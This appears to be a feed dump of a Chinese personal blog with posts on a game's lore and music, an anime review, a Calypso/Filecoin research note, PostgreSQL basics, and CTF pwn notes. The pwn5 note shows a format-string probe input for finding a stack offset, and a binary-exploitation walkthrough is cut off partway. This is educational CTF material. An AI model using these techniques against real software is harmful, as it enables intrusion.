src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230221001033278.png" alt="图80"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230221001043141.png" alt="图81"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230221001056782.png" alt="图82"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ender Lilies灰白色的童话</title>
      <link href="/qiuyu.github.io/2022/08/24/ender-lilies-hui-bai-se-de-tong-hua/"/>
      <url>/qiuyu.github.io/2022/08/24/ender-lilies-hui-bai-se-de-tong-hua/</url>
      
        <content type="html"><![CDATA[<p>以下内容全为个人观点。</p><h3 id="剧情部分"><a href="#剧情部分" class="headerlink" title="剧情部分"></a>剧情部分</h3><p>剧情部分我主要做一个前置剧情的梳理，整理一下整个事情发生的时间线，并对于女主的身份做个人的猜测，而对于游戏内的剧情流程则不再给予叙述。</p><ul><li><p>白女巫共有三代：初代的黎明之白女巫、二代的风之白女巫、三代的泉之白女巫，每代白女巫之间为母女关系。另外，第三代白巫女，泉之白巫女名为芙莉蒂雅，在某种意义上来讲是女主莉莉的母亲。</p></li><li><p>污秽：来源于边陲之国原住的古老民族，生于他们的怨念，污秽会传染他人，受污秽感染的人被称为秽鬼。</p></li><li><p>护身宝具：白巫女持有护身宝具，能缓解净化污秽所带来的痛苦，由初代白巫女传到现在。</p></li><li><p>石板：地图上各地散落着的石板残片上刻着古代咒术，修复后可以进行解读，其发动的咒术可以修复泉白与秽鬼之王战斗中破碎的护身宝具，是结束这场悲剧的关键，也是达到完美结局（结局C）的关键。</p></li><li><p>不死的契约：涉及灵魂的古代咒术只允许高级别的巫女使用，古老民族的战士通过对巫女献上灵魂的契约，舍弃肉体，成为不死的存在。巫女的契约印直到家族灭绝代代相传，契约不解，古老民族的战士永生不灭。与女主同行的黑色骑士就是这样的存在。</p></li></ul><p>在最初的时候，这片大陆的由一群古老民族所占领，有一天，一群外来者到达了这片地方并且选择侵占这里，于是双方的冲突由此爆发。这场战斗极为激烈，虽然外来者士兵占据人数优势，但是这些古老民族的人们率领的是由古代咒术而成的不死战士，外来者只能用魔法将他们封印住，惨烈的战争看不到尽头。</p><p>在漫长的战斗之后，最终是外来者们获得了胜利。虽然他们也尝试过寻找与古老民族共存的方法，可是一直未能成功。最终，这片土地被划分为六个国家，而游戏的故事就发生于这六个国家中的边陲之国。这里通年寒冷，并且有古老民族的存活。是的，他们并未灭绝，而是在酝酿污秽，最终成为秽鬼一涌而来，这为后面的危机埋下了不小的隐患。</p><p>有一天，边陲之国的初代国王在死地发现了一个孩子，孩子话不多，但是一直盯着他，小手紧紧地抓着他的衣服不放。她是古老民族的孩子，但可能是出于愧疚又或者可怜她还小，最终初代国王收养了这个古老民族的孩子。日后，这个孩子会有一个众人皆知的名字——黎明之白女巫。</p><p>古老民族的子孙在边陲之国是举足轻重的白巫女，是对抗污秽唯一的办法。然而，净化污秽的代价是遭受污秽的侵蚀。悲剧无法被阻止，只会一遍又一遍的上演。</p><p>在初代白女巫陨落之后，接替她位置的是二代白女巫——风之白女巫，在曾经双生堡垒的所在地发生过多次与秽鬼的战争，风白主导了对秽鬼的战争，并在这里修筑了双生堡垒以抵挡秽鬼的侵袭。</p><p>然而，风白在在泉之白女巫出生的那一天就消失了，个人推测原因是身体已经承受不住所吸收的污秽，成为了新的秽鬼之王。</p><p>暗部海尼尔的妹妹被现任边陲之国的国王看上，并带入了王宫。生下了私生子尤利乌斯，由于私生子的出生，海尼尔的妹妹命丧黄泉，同时海尼尔偷偷的将这个孩子养大，这个孩子便是日后的骑士长。</p><p>边陲之国成立了魔术协会，会长为黑色魔女伊莱恩，她与泉白是好朋友。魔术协会为白女巫制作魔术工具，与会接受讨伐秽鬼的请求。但是魔术协会不允许对古代咒术等禁忌魔术进行研究。</p><p>为了研究秽鬼以及古代咒术，魔术师法藤成立了国家魔术师团，招收推出魔术协会的魔术师，专门调查与秽鬼相关的研究，甚至进入禁区调查也无妨。就在法藤的调查中，他发现白女巫的污秽肉瘤与秽鬼身上的不同，它对于污秽侵蚀的速度和对意识的影响都有抑制作用。他希望用这一点做到让秽鬼恢复自我意识。（他在这里并不只是为了大局，而是因为他的助手兼情人也成为了秽鬼，这里有解救他助手的一层意思在内）可惜他失败了，但是却意外的发现新的实验体化为秽鬼后能保存自我意识，并且能够进行沟通。于是他把这种药称为不死灵药。</p><p>在泉之白女巫接替风白的位置后不久，双生堡垒防御战打响了。秽鬼又一次的向着边陲之国发起了攻击，这一次由泉白主导了防御战，这场战斗惨烈而漫长，狼、骑士长、黑色魔女、老战士都参加到了这次的战斗中。面对不死战士的攻击，城堡的骑士们只能不断抵抗，依靠着泉白的净化苦苦支撑。然而，泉白的身体状况随着净化的次数增多而迅速恶化。为了扭转这个局面，骑士长号召大家喝下魔术师团研究出的不死灵药，同秽鬼们战斗到底。也是在这次的战斗中，泉白与秽鬼之王展开了正面战斗。</p><p>最终，经过惨烈的战斗，双生堡垒防御战终于取得胜利，但是护身宝具也在这次与秽鬼之王的战斗中彻底破碎了。同样的，泉白的身体已经破碎不堪，最终在修女双子中的姐姐西丽亚的照看下，被转移到了地下接受治疗，最终被送往地下最深处——禁区。名义上为治疗，实际上是研究白巫女净化的原理，以及进行白巫女的克隆。</p><p>视角转回王都，骑士长尤利乌斯找到了现任国王，并与他对峙，现任国王内心充满了恐惧，根本不承认这个私生子。最终，骑士长亲手结束了国王的生命。</p><p>然而泉白最终也压制不住了污秽的力量，污秽之雨在边陲之国绵绵不断的落下。一切生物都变成了秽鬼，只剩下在白教堂沉睡的莉莉。</p><p>对于女主身份的猜测：在泉白的回忆中，出现了8个克隆的小巫女，他们分别散布在了游戏对应的每一个区域：白教堂、悬崖村、魔法森林、双生堡垒、地下墓穴、地牢、王都、禁区。但是很明显，女主属于第九个白巫女，这里不少人猜测女主是真正的莉莉。这里我对这种说法持否定意见。首先，“莉莉”这个名字不是女主的，而是在女主苏醒的白教堂上层楼中以及死亡的小白巫女的名字。游戏通篇并没有提到女主叫什么名字，所以用“莉莉”指代女主只是给女主一个能称呼的名字，那么女主就不叫莉莉，那么又有哪来的真正的莉莉一说呢？其实这个说法的意思是，其他8个小女巫是克隆的，女主不是克隆的。这个观点我也给予否认，在游戏的文档中，泉白的笔记里明显有提到过她没有子嗣的内容，另外，我们不妨这样想，如果女主是真正的莉莉，不是克隆的，那么说明泉白有子嗣，那么下一代白女巫就有人选了，那么就为什么又要克隆。如果说是为了更加高效的净化污秽，那么既然已经能克隆了，那么为什么还要再让泉白生一个呢？从时间上来看，几个克隆的白女巫叫女主为“妹妹”，也是说明克隆在前。无论哪种说法逻辑我都认为是讲不通的。所以我的观点是，女主就是第九个克隆白女巫，就只是比其他白女巫晚苏醒了，没有别的什么特殊的。</p><h3 id="音乐部分"><a href="#音乐部分" class="headerlink" title="音乐部分"></a>音乐部分</h3><p>先说一下双子姐妹的曲子吧。Bible &amp; Rosary一首是姐姐西丽亚的曲子，一首是妹妹西丽德的曲子。b站有将这两首曲子合在一起的版本：<a href="https://www.bilibili.com/video/BV1564y1b7oE" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1564y1b7oE</a></p><p>两首曲子用了相同的旋律，在高潮部分，姐姐用小提琴演奏主旋律，而妹妹用钢琴演奏伴奏。然而在游戏中这两者是被拆开了的，姐姐的曲子里没有妹妹的钢琴，妹妹的曲子里没有姐姐的提琴。这也暗暗隐示了游戏中姐妹相互分离，到死也没有相互和解的剧情。在游戏中，姐姐是成为了泉之白巫女的守护者，在地下守护着泉白。而妹妹则只是在教堂守护着泉白的一个克隆体小巫女。妹妹不理解姐姐，认为姐姐把她的守护者的职位抢走了，而姐姐知道守护者其实是很危险的。在死亡之雨落下的时候，面对数不尽的秽鬼，姐姐保护着泉白到最后一刻，可惜在死之前姐姐想着见妹妹一面，这个愿望永远没法实现了。同样的，妹妹在教堂里守护着小巫女，直到死亡。</p><p>姐妹的形象也同样引发人的联想，姐妹在形象上都有一对翅膀，但是姐姐的翅膀有羽无骨，妹妹的翅膀有骨无羽。在游戏中，击败姐姐后可以获得空中滑翔的能力（对应羽毛），击败妹妹后可以获得二段跳的能力（对应骨架）。两者在单独的情况下实际上是不能飞翔的，因为那根本就不是完整的翅膀。只有两者合二为一，骨架与羽毛并存，才能成为真正的翅膀，飞向天空。也正如姐妹的曲子一样，单独拆开的曲子是不完整的，只有将两者合起来，才是一首完整的曲子。</p><p>真正让我决定入坑的地方，还是在我听了North这首曲子之后：<a href="https://music.163.com/song?id=1850441830" target="_blank" rel="noopener">https://music.163.com/song?id=1850441830</a></p><p>这首曲子是双生堡垒的背景曲，双生堡垒是在上一次抵御秽鬼大军后建立的。上一代巫女与士兵们付出了极其惨痛的代价后建立了这座堡垒，同样的泉之白巫女也在这座堡垒中抵御过秽鬼大军的攻击。就是在这次攻击之后，泉白的身体开始支撑不住，逐渐转移到了地下。</p><p>让我们看一下一些游戏内的文本吧：</p><p>“教老子花名字的是泉之白巫女，她也真奇葩，老子除了战斗啥也不懂，她也不在乎，要教就教。老子很少跟其他人来往，嘴巴不怎么灵通，她看到了就笑了起来，但老子也没啥不爽。这次战役过后应该就不会再见面了，想了一想这也好吧。要是以后她来花田还在，她一定会很高兴吧，可惜老子再也无法继续守护下去了”——被净化后，狼回忆中的独白。</p><p>“第五天 对抗秽鬼之战已经打了五天了 从没看过这种数量的秽鬼大军 第十天 泉之白巫女越来越憔悴了 只要她一倒，我们全都玩完了 第十五天 就算我们打退秽鬼，之后又如何被家人看到现在的样子他们会怎么想 死都死不了的肉体和秽鬼没多大的分别吧 第二十天 身亻本不听亻吏唤 虽然意讠只辶不在”——守城士兵的记录。</p><p>当时我看到了这些文字的时候，便感觉一个个很有故事的画面浮现在眼前。这是一个哀伤、凄凉、无可奈何，但又坚定的故事——狼虽然只会战斗，但他在最后一刻也在守护泉白喜爱的那片花田。可是，死亡之雨的到来意味着狼的守护到此为止了。同样的，泉白也再也看不到这篇花田了。而那些守城的士兵们，为了抵挡秽鬼的进攻，喝下了魔术协会给他们的不死药。但是这个药实际上是有副作用，随着时间的推移，他们的意识逐渐模糊，守到最后，堡垒以及没有了活着的人，只剩下变为秽鬼的士兵。</p><p>这首曲子最开始的时候节奏很慢，很安静。就好像这里已经没有人存在的样子。给我一种“白茫茫大地真干净”的感觉，随着其他乐器的加入，好像是开始了回忆，回忆这场大战的过程。在大战开始之前，士兵们保持警惕，随时戒备，等待着秽鬼大军的进攻。随后，伴随着提琴的加入，主旋律响起，代表着战士们下定决心和秽鬼战斗到最后一刻。此刻，就算是不死药存在问题，但是士兵们为了抵挡住秽鬼的攻击，还是毅然的将其喝了下去，用意志支撑着自己的身躯。直到最后一刻，其他乐器停止了演奏，只剩下钢琴轻轻诉说着这里发生的故事，一切又归为平静。结束了，但也到此为止了。双生堡垒已经没有活着的人了，剩下的只有拿着武器仍然站在自己岗位上的——曾经的士兵，现在的秽鬼。</p><p>除了North这一首外，我还有一首比较喜欢的曲子是悬崖村的Harmonious：<a href="https://music.163.com/#/song?id=1850441824" target="_blank" rel="noopener">https://music.163.com/#/song?id=1850441824</a></p><p>整个曲子显得静悄悄的，开头的音乐就像是少女垫着脚尖，踏入了一个荒废多年的村庄，村庄内已然没有了活物，只剩下曾经的人们生活过的痕迹，在少女的哼唱声中回忆着这片土地上曾经发生过的事以及生活过的人们。</p><p>因为污秽之雨的来临，村子里的所有活物都变成了秽鬼，在少女的轻声叹息中，整个村子荒凉破败的景象逐渐展现在了大家的眼前。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单机游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Calypso</title>
      <link href="/qiuyu.github.io/2022/08/04/calypso/"/>
      <url>/qiuyu.github.io/2022/08/04/calypso/</url>
      
        <content type="html"><![CDATA[<p>Calypso系统最让我注意的还是两个地方的设计，其中一个是skipchain，另一个的on-chain secret</p><p>skipchain的话，有趣的地方在于它的每一个区块，都会给下一个区块签名。并且skipchain做到了访问控制。也就是writer可以设置自己希望让谁看到自己写的秘密，然后把他的id加到skipchain里面，不过这个我暂时还想不到和filecoin结合的地方，就暂时先放一下。</p><p>关于on-chain secret。这个系统设计了长期秘密和一次性秘密两种情况。这里就先说一下长期秘密的情况。这里对于DKG的使用也许对现在filecoin的checkpoint设计有所启发。checkpoint目前的一个问题在于使用DKG会造成密钥数量过于庞大，尤其是对于股份多的账户来说，管理和股份数量相当的密钥会很麻烦。这里Claypso的作法是，加密用对称密钥k，而DKG则对k进行加密保护。这样就不用每次加密时重新生成DKG公私密钥对。这个方法是否可以真正的减少checkpoint所面临的问题，可以进一步研究。</p>]]></content>
      
      
      <categories>
          
          <category> research </category>
          
      </categories>
      
      
        <tags>
            
            <tag> checkpoint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于恐怖题材基点的思考</title>
      <link href="/qiuyu.github.io/2022/06/12/guan-yu-kong-bu-ti-cai-ji-dian-de-si-kao/"/>
      <url>/qiuyu.github.io/2022/06/12/guan-yu-kong-bu-ti-cai-ji-dian-de-si-kao/</url>
      
        <content type="html"><![CDATA[<p>最近看完了《Another》，想来想去还是感觉对恐怖题材的基点产生了一些思考。</p><p>恐怖题材的作品，为了让观众能体验到身临其境的恐怖感，都会营造一种恐怖的氛围。这种氛围的如何营造，不同作品给出了不同风格的答案。</p><p>但是，这些作品的基点却各不相同。有的是立足于玄学上增加了一些科学的逻辑，有的是立足于科学上利用信息不对等造成玄学的混淆效果。不论是哪一种，一定要明确作品的基点，是玄学还是科学。</p><p>如果是玄学，那就大胆的走，让观众们相信这个玄学的设定之后尽情的发挥。但如果是科学的话，就要思考，前面营造的玄学的氛围和现象，在最后是否能圆回来。</p><p>《Another》给我的感觉，总像是拿科学写玄学。对于“灾难”这种现象，应该是属于玄学。但是总想解释清楚。但是这种“灾难”就是很蛮横，很不讲理。就是感觉只能在最后把主体讲清楚，旁支就直接不管了。有些角色的某些动作，是为了推动剧情发展而服务的，但是这种动作是否合理呢？有些角色从头到尾就很安分，然后后面就突然发疯一样像干掉女主，从理由上来讲，她的理由也算是有。但是，多给一点镜头，给一点缓冲是不是更好呢？在战胜“灾难”的道路上，每走一步就会有人死亡，这是不可避免的。但是还是给我一种：嗯，在这个地方应该死人了，那不好意思，你随便一个理由死一下，去领盒饭吧。的这种感觉。在我的观点看来，如果能变成死亡和解谜的过程相关，但死亡又看上去像是场意外，这种效果表现出来的话，应该会更好。</p><p>对于主角们对抗这种“灾难”的过程，总是给我一种恐怖氛围不够的感觉。想营造恐怖氛围，不能只依靠角色们天天默不作声，面露难色，怨天尤人的态度。以及在死亡瞬间留给观众的视觉冲击，也只是片刻的恐怖。我仍然坚信，最大的恐惧来源于未知，未知带来的恐惧引发猜疑，在猜疑中崩溃，从而引发疯狂。这个流程是我在阿加莎的名作《无人生还》中看到的。阿加莎的这个作品的悬疑感实在是拉满，也是让我再遇到同类型题材的作品时提高了眼光。《Another》的整体流程其实和这个有几分相像，可惜节奏把握的有点欠妥。前面为了制造悬疑感而用了大量的谜语人叙述方式，导致后面的剧情演出显得有点仓促。既然就是准备写玄学，那就放开了再来狂飙一点（要不就写一点前几代三班人故事插曲）。让我对这种玄学更加相信。</p><p>整体来说的话，我大概可以给《Another》打6.5分（肯定在及格线以上，但我有点过于看重剧情。如果不这么看重的话，评个7分应该也没问题）对于猎奇方面的演出，bgm的诡异程度来讲，还是一个很有意思的作品。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恐怖题材作品 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn5是如何计算出栈偏移的</title>
      <link href="/qiuyu.github.io/2022/03/27/pwn5-shi-ru-he-ji-suan-chu-zhan-pian-yi-de/"/>
      <url>/qiuyu.github.io/2022/03/27/pwn5-shi-ru-he-ji-suan-chu-zhan-pian-yi-de/</url>
      
        <content type="html"><![CDATA[<p>[第五空间2019决赛]pwn5的作法再次就不再细讲了，网上wp有很多。比如<a href="https://blog.csdn.net/hahahaboooo/article/details/117046925" target="_blank" rel="noopener">https://blog.csdn.net/hahahaboooo/article/details/117046925</a></p><p>和<a href="https://www.jianshu.com/p/0501f4dbaf9e" target="_blank" rel="noopener">https://www.jianshu.com/p/0501f4dbaf9e</a></p><p>写这道题最好用的就是fmtstr_payload()函数，而用这个函数最重要的一点就是怎么得到栈偏移的。</p><p>其实是这么看的</p><p>以上的wp中都有这么个操作：当让输入name的时候，输入了个AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</p><p>这个”.”就是分隔用的，不用管，主要是%x表示读取16进制数值，也就是这个read读的这个东西是放在栈里面的，除了把AAAA读出来之外，%x可以把栈里面其他东西带出来。AAAA的ascll码是41，那么这个存储结果就应该是41414141这个东西</p><p>然后就只需要从第一个输出的东西往后查，看查到那一个正好到41414141.那么栈偏移就是多少。</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>psql基本操作</title>
      <link href="/qiuyu.github.io/2022/03/21/psql-ji-ben-cao-zuo/"/>
      <url>/qiuyu.github.io/2022/03/21/psql-ji-ben-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><h3 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> datebase <span class="token operator">&lt;</span>数据库名<span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">index</span> <span class="token operator">&lt;</span>索引名<span class="token operator">></span> <span class="token keyword">on</span> <span class="token operator">&lt;</span>表名<span class="token operator">></span><span class="token operator">&lt;</span> <span class="token punctuation">(</span>列名<span class="token punctuation">)</span> <span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>索引的作用：支持对数据库表中数据快速查找</p><h3 id="插入类"><a href="#插入类" class="headerlink" title="插入类"></a>插入类</h3><h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token operator">&lt;</span>表名<span class="token operator">|</span>视图名<span class="token operator">></span><span class="token punctuation">[</span><span class="token operator">&lt;</span>列名表<span class="token operator">></span><span class="token punctuation">]</span> <span class="token keyword">values</span> <span class="token punctuation">(</span>列值表<span class="token punctuation">)</span><span class="token punctuation">;</span>eg:<span class="token keyword">insert</span> <span class="token keyword">into</span> student <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'2020xxxxxxxx'</span><span class="token punctuation">,</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'软件工程'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#在student表中插入一个新的数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">database</span> <span class="token operator">&lt;</span>数据库名<span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">index</span> <span class="token operator">&lt;</span>索引名<span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">delete</span><span class="token keyword">from</span> <span class="token operator">&lt;</span>表名<span class="token operator">|</span>视图名<span class="token operator">></span><span class="token punctuation">[</span><span class="token keyword">where</span> <span class="token operator">&lt;</span>条件表达式<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><h4 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">database</span> <span class="token operator">&lt;</span>数据库名<span class="token operator">></span> <span class="token operator">&lt;</span>修改内容<span class="token operator">></span>eg:<span class="token keyword">alter</span> <span class="token keyword">database</span> xxx <span class="token keyword">rename</span> <span class="token keyword">to</span> xxxx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="修改索引"><a href="#修改索引" class="headerlink" title="修改索引"></a>修改索引</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">index</span> <span class="token operator">&lt;</span>索引名<span class="token operator">></span> <span class="token operator">&lt;</span>修改项<span class="token operator">></span><span class="token punctuation">;</span>eg:<span class="token keyword">alter</span> <span class="token keyword">index</span> <span class="token operator">&lt;</span>索引名<span class="token operator">></span> <span class="token keyword">rename</span> <span class="token keyword">to</span> <span class="token operator">&lt;</span>新索引名<span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">update</span> <span class="token operator">&lt;</span>表名<span class="token operator">|</span>视图名<span class="token operator">></span><span class="token keyword">set</span> <span class="token operator">&lt;</span>列名<span class="token number">1</span><span class="token operator">>=</span><span class="token operator">&lt;</span>表达式<span class="token number">1</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token operator">&lt;</span>列名<span class="token number">2</span><span class="token operator">>=</span><span class="token operator">&lt;</span>表达式<span class="token number">2</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">where</span> <span class="token operator">&lt;</span>条件表达式<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p>数据查询</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">&lt;</span>目标列<span class="token operator">></span><span class="token punctuation">[</span><span class="token keyword">into</span> <span class="token operator">&lt;</span>新表<span class="token punctuation">]</span><span class="token keyword">from</span> <span class="token operator">&lt;</span>表名<span class="token operator">|</span>视图名<span class="token operator">></span><span class="token punctuation">[</span><span class="token keyword">where</span> <span class="token operator">&lt;</span>条件表达式<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token operator">&lt;</span>列名<span class="token operator">></span><span class="token punctuation">[</span><span class="token keyword">having</span> <span class="token operator">&lt;</span>条件表达式<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token operator">&lt;</span>列名<span class="token operator">></span><span class="token punctuation">[</span><span class="token keyword">asc</span><span class="token operator">|</span><span class="token keyword">desc</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">&lt;</span>目标列<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token operator">&lt;</span>目标列<span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token keyword">from</span> <span class="token operator">&lt;</span>关系表<span class="token operator">></span><span class="token punctuation">[</span><span class="token keyword">where</span> <span class="token operator">&lt;</span>条件表达式<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#select * 代表查询全部</span><span class="token comment" spellcheck="true">#where 加上限定条件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="where条件子句"><a href="#where条件子句" class="headerlink" title="where条件子句"></a>where条件子句</h4><p>可以使用between…and关键字来限定列值范围</p><p>使用通配符来限定字符串数据范围。下划线(_)代表一个，百分号(%)代表多个。可以与关键字like连用</p><p>逻辑运算符and or not不展开</p><p>in关键字可以限定范围</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">where</span> major <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'计算机'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="结果排序"><a href="#结果排序" class="headerlink" title="结果排序"></a>结果排序</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">order</span> <span class="token keyword">by</span> xxx <span class="token keyword">desc</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#desc降序，asc升序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h4><table><thead><tr><th align="center">聚合函数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">avg()</td><td align="center">计算结果集指定列数据的平均值</td></tr><tr><td align="center">count()</td><td align="center">计算结果集行数</td></tr><tr><td align="center">min()</td><td align="center">找出结果集指定列数据的最小值</td></tr><tr><td align="center">max()</td><td align="center">找出结果集指定列数据的最大值</td></tr><tr><td align="center">sum()</td><td align="center">计算结果集指定列数据的总和</td></tr></tbody></table><h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><p>对查询结果分组统计，用group by子语句</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> xx<span class="token keyword">from</span> xx<span class="token keyword">where</span> xx<span class="token keyword">group</span> <span class="token keyword">by</span> xx<span class="token keyword">having</span> xx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> postgresql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU rip</title>
      <link href="/qiuyu.github.io/2022/02/16/buu-rip/"/>
      <url>/qiuyu.github.io/2022/02/16/buu-rip/</url>
      
        <content type="html"><![CDATA[<h3 id="做pwn题的基本流程："><a href="#做pwn题的基本流程：" class="headerlink" title="做pwn题的基本流程："></a>做pwn题的基本流程：</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216103342327-16449993634611.png" alt="图1"></p><p>首先是先flie看一下，最重要的是看这是个什么文件，一般都是ELF。然后就看是多少位的，这个是64位的，那么它的地址就是8位。如果是32位的，那么它的地址就是4位。最后看到这个是动态链接，和它相对的是静态链接。</p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216114049822-16449993634622.png" alt="图2"></p><p>在分析之前，最好先运行一下。属性一下它是怎么运行的。</p><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216104241504-16449993634623.png" alt="图3"></p><p>用file看完基本信息之后，就用gdb看一下。用checksec查看一下这个的保护机制。如果哪个保护机制开了，那就具体问题具体分析。</p><p>gdb有个很好用的插件，是peda。用这个可以详细的看文件运行的情况。</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216104616244-16449993634624.png" alt="图4"></p><p>主要的几个寄存器</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216104728244-16449993634625.png" alt="图5"></p><h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p>拖进ida分析，查看几个函数，具体不再赘述。</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216114523867-16449993634626.png" alt="图6"></p><p>主要就是要找到这样一个函数，它其中有一句”system 